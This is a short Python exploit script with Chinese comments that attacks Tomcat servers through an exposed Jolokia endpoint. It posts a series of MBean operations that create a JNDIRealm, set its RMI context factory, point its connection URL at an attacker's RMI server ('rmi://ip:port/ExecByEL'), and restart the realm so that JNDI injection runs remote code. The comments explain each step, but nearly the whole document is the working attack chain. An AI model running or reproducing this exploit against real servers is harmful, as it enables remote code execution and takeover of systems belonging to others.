import requests as req
import sys
from pprint import pprint

url = sys.argv[1] + "/jolokia/" // url：即指定目标
pprint(url)
#创建JNDIRealm // JNDIRealm：访问保存在 LDAP 目录服务器中的验证信息。 简单的来说就是对tomcat进行配置
create_JNDIrealm = {
"mbean": "Tomcat:type=MBeanFactory",
"type": "EXEC",
"operation": "createJNDIRealm",
"arguments": ["Tomcat:type=Engine"]
}
#写入contextFactory
set_contextFactory = {
"mbean": "Tomcat:realmPath=/realm0,type=Realm",
"type": "WRITE",
"attribute": "contextFactory",
"value": "com.sun.jndi.rmi.registry.RegistryContextFactory" //提供注册表的创建以及查找和命名远程对象的类、接口和异常 为了写入我们配置的rmi服务器以及
}
#写入connectionURL为自己公网RMI service地址
set_connectionURL = {
"mbean": "Tomcat:realmPath=/realm0,type=Realm",
"type": "WRITE",
"attribute": "connectionURL",
"value": "rmi://ip:port/ExecByEL" //此时的地址为我们之前在java代码中设置的目标，以及端口，然后调用方法
}
#停止Realm
stop_JNDIrealm = {
"mbean": "Tomcat:realmPath=/realm0,type=Realm",
"type": "EXEC",
"operation": "stop",
"arguments": []
}
#运行Realm，触发JNDI 注入
start = {
"mbean": "Tomcat:realmPath=/realm0,type=Realm",
"type": "EXEC",
"operation": "start",
"arguments": []
} //相当于保存配置，然后重新运行

expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]

for i in expoloit:
rep = req.post(url, json=i) // 使用post 发送数据
pprint(rep.json())